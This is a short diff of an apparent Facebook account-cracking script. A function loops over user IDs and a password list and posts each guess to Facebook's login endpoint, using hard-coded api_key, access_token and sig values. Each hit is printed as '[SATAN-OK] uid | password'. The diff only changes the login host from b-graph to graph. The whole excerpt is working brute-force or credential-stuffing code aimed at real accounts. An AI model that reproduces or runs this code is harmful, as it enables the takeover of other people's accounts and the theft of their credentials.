@@ -78,7 +78,7 @@ def api1(ids,names,passlist,total_ids):
 'api_key':'882a8490361da98702bf97a021ddc14d',
 'access_token':'256002347743983%7C374e60f8b9bb6b8cbb30f78030438895',
 'sig':'4c854da0db9429f4913c2a1b221c1d30'}
-			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
+			po = requests.post('https://graph.facebook.com/auth/login',data=data,headers=head).json()
 			if 'session_key' in po:
 				uid = str(po['uid'])
 				print('\r\r\033[1;32m [SATAN-OK] '+uid+' | '+pas)
